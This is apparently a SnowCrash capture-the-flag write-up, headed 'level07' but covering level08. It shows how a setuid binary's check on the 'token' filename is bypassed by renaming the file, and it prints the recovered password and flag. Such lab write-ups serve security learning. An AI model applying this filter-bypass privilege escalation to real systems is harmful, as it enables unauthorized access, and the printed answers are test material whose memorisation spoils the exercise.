# level07

We found a executable with extended permissions(ACL) and a file "token".

```
level08@SnowCrash:~$ ls -la
total 28
dr-xr-x---+ 1 level08 level08  140 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level08 level08  220 Apr  3  2012 .bash_logout
-r-x------  1 level08 level08 3518 Aug 30  2015 .bashrc
-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
-r-x------  1 level08 level08  675 Apr  3  2012 .profile
-rw-------  1 flag08  flag08    26 Mar  5  2016 token
```
The Access Control Lists (ACLs) allow you to set different permissions for one or more users/ groups on a file/ directory.

First thing we try to execute it:

```
level08@SnowCrash:~$ ./level08 
./level08 [file to read]
level08@SnowCrash:~$ ./level08 token 
You may not access 'token'
```
we therefore looked into the rights of the files:

```

level08@SnowCrash:~$ getfacl level08 token
# file: level08
# owner: flag08
# group: level08
# flags: ss-
user::rwx
group::---
group:level08:r-x
group:flag08:r-x
mask::r-x
other::---

# file: token
# owner: flag08
# group: flag08
user::rw-
group::---
other::---

```

```

level08@SnowCrash:~$ ltrace ./level08 /token
__libc_start_main(0x8048554, 2, 0xbffff7d4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("/token", "token")                                    = "token"
printf("You may not access '%s'\n", "/token"You may not access '/token'
)                = 28
exit(1 <unfinished ...>
+++ exited (status 1) +++

```


So the token file read with flag08 rights. The executable allows you to read a file with flag08 rights, unless it contains the word `token`. As we have the necessary rights we change the file name.


```
mv ./token ./notoken
./level08 ./notoken
```

```
level08@SnowCrash:~$ ./level08 ./notoken
quif5eloekouj29ke0vouxean
```

```
level08@SnowCrash:~$ su flag08
Password: 
Don't forget to launch getflag !
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```
Weheee one last token to go!!!
